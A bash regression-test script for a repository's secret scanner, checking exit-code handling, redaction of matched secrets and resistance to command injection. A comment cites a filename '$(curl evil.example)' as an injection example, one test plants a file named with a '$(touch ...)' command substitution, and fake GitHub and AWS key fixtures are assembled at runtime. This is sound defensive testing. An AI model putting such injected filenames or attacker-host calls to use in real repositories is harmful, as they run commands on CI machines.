#!/usr/bin/env bash
# Regression tests for tests/release-hygiene.sh's scan_pattern() exit-code handling.
#
# Guards against the false-green bug where `if grep ...; then fail; else pass; fi`
# could not distinguish "no match" (grep exit 1) from "grep errored" (exit >1) --
# both landed in the same "pass" branch -- and against a real match being reported
# by printing the matched secret-looking bytes instead of just a filename.
#
# release-hygiene.sh locates its own repo root from $BASH_SOURCE and scans via
# `git grep`/`git ls-files`, so each case needs a disposable, fully functional git
# repo copy -- not just a copy of the files. Injecting a fake secret into the real
# tracked tree would itself be exactly the kind of commit this scanner exists to
# prevent, so every fixture lives in a throwaway clone instead.
set -u

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
FAILURES=0

check() {
  local desc="$1"; shift
  if "$@"; then
    echo "[PASS] $desc"
  else
    echo "[FAIL] $desc"
    FAILURES=$((FAILURES + 1))
  fi
}

make_repo_copy() {
  local dest="$1"
  # A real clone, not a plain file copy: release-hygiene.sh calls `git grep` /
  # `git ls-files`, which need an actual .git directory to work at all.
  #
  # Cloning (not `xargs`-driven `cp`) also matters for safety: an earlier version of
  # this helper piped `git ls-files` through `xargs -I{} sh -c '...{}...'`, which
  # interpolated each filename into a shell program -- a tracked file named e.g.
  # `$(curl evil.example)` would have executed on every PR, since this test runs on
  # `pull_request`. `git clone` never passes a filename through a shell string.
  git clone --quiet "$ROOT_DIR" "$dest" >/dev/null 2>&1
}

# A test whose own setup silently fails (clone, add, chmod) must not read as a pass
# just because the thing it was checking for didn't happen -- it never ran the real
# check. Each test below verifies its setup succeeded before trusting the result.

# Verifies the injection fix directly: a tracked file whose NAME is a shell command
# substitution must never execute when the scanner (or this test harness) touches it.
test_malicious_filename_is_inert() {
  local tmp marker_name; tmp="$(mktemp -d)"; marker_name="PWNED_MARKER_$$_$RANDOM"
  make_repo_copy "$tmp" || { rm -rf "$tmp"; return 1; }
  # A filename can legally contain `$(...)` -- it cannot contain `/`, so the payload
  # must be a relative, slash-free command for this to be a valid filename at all.
  local evil_name="\$(touch $marker_name).txt"
  if ! (cd "$tmp" && touch -- "$evil_name" && git add -- "$evil_name" >/dev/null 2>&1); then
    rm -rf "$tmp"; return 1
  fi
  bash "$tmp/tests/release-hygiene.sh" >/dev/null 2>&1
  # If the injection fired, the marker would land somewhere under $tmp (whatever cwd
  # the vulnerable code happened to run in) -- search broadly, not just one guess.
  local hit; hit="$(find "$tmp" -name "$marker_name" 2>/dev/null | head -1)"
  rm -rf "$tmp"
  [ -z "$hit" ]
}

# Fixture secrets are assembled from parts at runtime, never written as one
# contiguous literal in THIS file -- otherwise this test script's own source would
# be flagged by the scanner it's testing (it lives under tests/, which is scanned
# like everything else; there is no blanket tests/ exclusion, by design).
fake_pat() { printf '%s%s' "github_pat_" "1234567890ABCDEFGHIJ"; }
fake_akia() { printf 'AKIA%s' "ABCDEFGHIJKLMNOP"; }

test_match_fails_and_redacts() {
  local tmp secret; tmp="$(mktemp -d)"; secret="$(fake_pat)"
  make_repo_copy "$tmp" || { rm -rf "$tmp"; return 1; }
  mkdir -p "$tmp/leaktest"
  printf 'token=%s\n' "$secret" > "$tmp/leaktest/oops.txt"
  if ! (cd "$tmp" && git add leaktest/oops.txt >/dev/null 2>&1); then
    rm -rf "$tmp"; return 1
  fi
  local out; out="$(bash "$tmp/tests/release-hygiene.sh" 2>&1)"
  local ok=1
  if echo "$out" | grep -q "\[FAIL\] no committed secret-looking material" \
     && ! echo "$out" | grep -qF "$secret"; then
    ok=0
  fi
  rm -rf "$tmp"
  return "$ok"
}

# A secret can be committed AS a filename, not just inside file content -- and
# reporting the match must redact the secret substring, since here the filename IS
# the secret (unlike a content match, where the filename and the secret differ).
test_filename_secret_is_detected_and_redacted() {
  local tmp fname; tmp="$(mktemp -d)"; fname="$(fake_akia).txt"
  make_repo_copy "$tmp" || { rm -rf "$tmp"; return 1; }
  if ! (cd "$tmp" && touch -- "$fname" && git add -- "$fname" >/dev/null 2>&1); then
    rm -rf "$tmp"; return 1
  fi
  local out; out="$(bash "$tmp/tests/release-hygiene.sh" 2>&1)"
  rm -rf "$tmp"
  echo "$out" | grep -q "\[FAIL\] no committed secret-looking material" \
    && echo "$out" | grep -q "(filename) \[REDACTED\]\.txt" \
    && ! echo "$out" | grep -qF "$fname"
}

test_scan_error_fails_not_clean() {
  local tmp; tmp="$(mktemp -d)"
  make_repo_copy "$tmp" || { rm -rf "$tmp"; return 1; }
  [ -f "$tmp/README.md" ] || { rm -rf "$tmp"; return 1; }
  # Deny read access to a TRACKED file's working-tree content -- git grep must fail
  # trying to read it, which is the real-world shape of a scan error (as opposed to
  # an untracked unreadable directory, which git grep never touches in the first
  # place, since it only walks tracked paths).
  chmod 000 "$tmp/README.md" || { rm -rf "$tmp"; return 1; }
  local out rc
  out="$(bash "$tmp/tests/release-hygiene.sh" 2>&1)"; rc=$?
  chmod 644 "$tmp/README.md"
  rm -rf "$tmp"
  [ "$rc" -ne 0 ] && echo "$out" | grep -q "scan error"
}

test_clean_tree_passes() {
  local tmp; tmp="$(mktemp -d)"
  make_repo_copy "$tmp" || { rm -rf "$tmp"; return 1; }
  local out rc
  out="$(bash "$tmp/tests/release-hygiene.sh" 2>&1)"; rc=$?
  rm -rf "$tmp"
  [ "$rc" -eq 0 ] && ! echo "$out" | grep -q "\[FAIL\]"
}

check "a maliciously named tracked file never executes (command-injection check)" test_malicious_filename_is_inert
check "genuine secret match fails the scan and never prints the matched value" test_match_fails_and_redacts
check "a secret embedded in a filename is detected and redacted, not printed raw" test_filename_secret_is_detected_and_redacted
check "a scan error (unreadable tracked file) fails the scan, not reported as clean" test_scan_error_fails_not_clean
check "a genuinely clean tree still passes (no false positives from the fix)" test_clean_tree_passes

echo "=============================="
if [ "$FAILURES" -eq 0 ]; then
  echo "All release-hygiene scanner regression tests passed."
  exit 0
else
  echo "$FAILURES regression test(s) failed."
  exit 1
fi
